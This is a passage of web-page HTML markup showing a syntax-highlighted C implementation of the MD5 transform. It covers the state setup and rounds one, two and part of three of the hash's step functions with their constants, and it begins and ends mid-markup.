punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> c <span class=\"token operator\">=</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> d <span class=\"token operator\">=</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>     <span class=\"token function\">MD5Decode</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>block<span class=\"token punctuation\">,</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>     <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd76aa478</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 1 */</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe8c7b756</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 2 */</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x242070db</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 3 */</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc1bdceee</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 4 */</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf57c0faf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 5 */</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4787c62a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 6 */</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa8304613</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 7 */</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfd469501</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 8 */</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x698098d8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 9 */</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8b44f7af</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 10 */</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xffff5bb1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 11 */</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x895cd7be</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 12 */</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6b901122</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 13 */</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfd987193</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 14 */</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa679438e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 15 */</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49b40821</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 16 */</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre> </pre></td></tr><tr><td data-num=\"104\"></td><td><pre> <span class=\"token comment\">/* Round 2 */</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf61e2562</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 17 */</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc040b340</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 18 */</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x265e5a51</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 19 */</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe9b6c7aa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 20 */</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd62f105d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 21 */</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x2441453</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 22 */</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd8a1e681</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 23 */</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe7d3fbc8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 24 */</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21e1cde6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 25 */</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc33707d6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 26 */</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf4d50d87</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 27 */</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x455a14ed</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 28 */</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa9e3e905</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 29 */</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfcefa3f8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 30 */</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x676f02d9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 31 */</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8d2a4c8a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 32 */</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre> </pre></td></tr><tr><td data-num=\"122\"></td><td><pre> <span class=\"token comment\">/* Round 3 */</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfffa3942</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 33 */</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8771f681</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 34 */</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6d9d6122</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 35 */</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfde5380c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 36 */</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa4beea44</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 37 */</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4bdecfa9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 38 */</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf6bb4b60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 39 */</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbebfbc70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 40 */</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x289b7ec6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 41 */</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xeaa127fa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 42 */</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd4ef3085</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 43 */</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x4881d05</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 44 */</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd9d4d039</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 45 */</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe6db99e5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 46 */</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1fa27cf8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 47 */</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token 